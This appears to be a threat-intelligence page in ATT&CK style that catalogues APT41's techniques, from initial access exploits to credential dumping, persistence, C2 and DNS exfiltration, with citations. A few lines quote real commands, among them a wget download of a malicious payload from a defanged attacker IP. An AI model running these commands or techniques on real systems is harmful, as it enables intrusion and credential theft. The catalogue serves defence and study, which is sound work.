Use: During C0017 , APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\SYSTEM privilege escalation. [5]
APT41 used built-in net commands to enumerate local administrator groups. [6]
APT41 used built-in net commands to enumerate domain administrator users. [6]
APT41 has added user accounts to the User and Admin groups. [1]
APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications. [6]
APT41 leverages various tools and frameworks to brute-force directories on web servers. [6]
APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. [7] During C0017 , APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads. [5]

Technique: Application Layer Protocol: File Transfer Protocols
Use: APT41 used exploit payloads that initiate download via ftp . [7]
APT41 used DNS for C2 communications. [1] [2]

Technique: Archive Collected Data: Archive via Utility
Use: APT41 created a RAR archive of targeted files for exfiltration. [1]

Technique: Archive Collected Data: Archive via Custom Method
Use: During C0017 , APT41 hex-encoded PII data prior to exfiltration. [5]
APT41 used BITSAdmin to download and install payloads. [7] [3]

Technique: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Use: APT41 created and modified startup files for persistence. [1] [2] APT41 added a registry key in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost to establish persistence for Cobalt Strike. [7]
APT41 performed password brute-force attacks on the local admin account. [1]
APT41 leveraged PowerShell to deploy malware families in victims’ environments. [1] [7]

Technique: Command and Scripting Interpreter: Windows Command Shell
Use: APT41 used cmd.exe /c to execute commands on remote machines. [1] APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader. [7] During C0017 , APT41 used cmd.exe to execute reconnaissance commands. [5]

Technique: Command and Scripting Interpreter: Unix Shell
Use: APT41 executed file /bin/pwd in activity exploiting CVE-2019-19781 against Citrix devices. [7]
During C0017 , APT41 deployed JScript web shells on compromised systems. [5]
APT41 has created user accounts. [1]

Technique: Create or Modify System Process: Windows Service
Use: APT41 modified legitimate Windows services to install malware backdoors. [1] [2] APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike. [7]

Technique: Credentials from Password Stores: Credentials from Web Browsers
Use: APT41 used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores. [6]
APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user. [1]

Technique: Data from Information Repositories: Code Repositories
Use: APT41 cloned victim user Git repositories during intrusions. [6]

APT41 has uploaded files and data from a compromised host. [2] During C0017 , APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. [5]
During C0017 , APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server. [5]
During C0017 , APT41 copied the local SAM and SYSTEM Registry hives to a staging directory. [5]
APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection. [6]
During C0017 , APT41 used the DUSTPAN loader to decrypt embedded payloads. [5]
APT41 has used DGAs to change their C2 servers monthly. [1]
APT41 leveraged sticky keys to establish persistence. [1]

APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number. [8]

Technique: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol
Use: During C0017 , APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain. [5]
During C0017 , APT41 used its Cloudflare services C2 channels for data exfiltration. [5]
During C0017 , APT41 used Cloudflare services for data exfiltration. [5]

APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices. [7] APT41 leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access. [6] During C0017 , APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access. [5]
APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396. [1]
During C0017 , APT41 abused named pipe impersonation for privilege escalation. [5]
APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service. [1]
APT41 used the Steam community page as a fallback mechanism for C2. [1]
APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information. [7]
To support initial access, APT41 gained access to databases with information about existing accounts as well as plaintext and hashed passwords. [6]

Technique: Gather Victim Identity Information: Employee Names
Use: To support initial access, APT41 gained access to databases with information about existing accounts and lists of employees. [6]

Technique: Hijack Execution Flow: DLL Search Order Hijacking
Use: APT41 has used search order hijacking to execute malicious payloads, such as Winnti RAT. [3]
APT41 used legitimate executables to perform DLL side-loading of their malware. [1]

Technique: Hijack Execution Flow: Dynamic Linker Hijacking
Use: APT41 has configured payloads to load via LD_PRELOAD. [3]
APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging. [6]

Technique: Indicator Removal: Clear Windows Event Logs
Use: APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events. [1]
APT41 attempted to remove evidence of some of its activity by deleting Bash histories. [1]
APT41 deleted files from the system. [1] [6]

APT41 used certutil to download additional files. [7] [3] [2] APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access. [6] During C0017 , APT41 downloaded malicious payloads onto compromised systems. [5]
APT41 used a keylogger called GEARSHIFT on a target system. [1]
APT41 uses remote shares to move and remotely execute payloads during lateral movemement. [6]
APT41 has created services to appear as benign system tools. [2] During C0017 , APT41 used SCHTASKS  /Change to modify legitimate scheduled tasks to run malicious code. [5]

Technique: Masquerading: Match Legitimate Name or Location
Use: APT41 attempted to masquerade their files as popular anti-virus software. [1] [2] During C0017 , APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE , and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections. [5]
APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials. [1] [2]
APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor. [7]
APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets. [1]
APT41 used the net share command as part of network reconnaissance. [1] [2]
APT41 used VMProtected binaries in multiple intrusions. [7] During C0017 , APT41 broke malicious binaries, including DEADEYE and KEYPLUG , into multiple sections on disk to evade detection. [5]
APT41 uses packers such as Themida to obfuscate malicious files. [6] During C0017 , APT41 used VMProtect to slow the reverse engineering of malicious binaries. [5]

APT41 has obtained and used tools such as Mimikatz , pwdump , PowerSploit , and Windows Credential Editor . [1] For C0017 , APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato. [5]
APT41 has used hashdump, Mimikatz , and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts. [1] [2]

Technique: OS Credential Dumping: Security Account Manager
Use: APT41 extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies. [6] During C0017 , APT41 copied the SAM and SYSTEM Registry hives for credential harvesting. [5]
APT41 used ntdsutil to obtain a copy of the victim environment ntds.dit file. [6]
APT41 used net group commands to enumerate various Windows user groups and permissions. [6]
APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. [1]
APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems. [1]
APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process. [1]
APT41 used a tool called CLASSFON to covertly proxy network communications. [1] During C0017 , APT41 used the Cloudflare CDN to proxy C2 traffic. [5]
APT41 queried registry values to determine items such as configured RDP ports and network configurations. [6]
APT41 used RDP for lateral movement. [1] [3]
APT41 has transferred implant files using Windows Admin Shares. [3]
APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment. [1]
APT41 deployed rootkits on Linux systems. [1] [3]

APT41 used a compromised account to create a scheduled task on a system. [1] [3] During C0017 , APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \Microsoft\Windows\PLA\Server Manager Performance Monitor , \Microsoft\Windows\Ras\ManagerMobility , \Microsoft\Windows\WDI\SrvSetupResults , and \Microsoft\Windows\WDI\USOShared . [5]

Technique: Search Open Technical Databases: Scan Databases
Use: APT41 uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims. [6]
During C0017 , APT41 deployed JScript web shells through the creation of malicious ViewState objects. [5]
APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations. [1] [2]

Technique: Supply Chain Compromise: Compromise Software Supply Chain
Use: APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users. [1]

Technique: System Binary Proxy Execution: Compiled HTML File
Use: APT41 used compiled HTML (.chm) files for targeting. [1]
APT41 has used rundll32.exe to execute a loader. [3]

APT41 uses multiple built-in commands such as systeminfo and net config Workstation to enumerate victim system basic configuration information. [6] During C0017 , APT41 issued ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems. [5]
APT41 collected MAC addresses from victim machines. [1] [2] During C0017 , APT41 used cmd.exe /c ping %userdomain% for discovery. [5]

APT41 has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions. [1] [2]
APT41 has executed whoami commands, including using the WMIEXEC utility to execute this on remote machines. [1] [6] During C0017 , APT41 used whoami to gather information from victim machines. [5]
APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader. [7] [2]

Technique: Use Alternate Authentication Material: Pass the Hash
Use: APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes. [6]
APT41 used compromised credentials to log on to other systems. [1] [3]

APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet. [1] During C0017 , APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign. [5]
APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit . [1] [2]
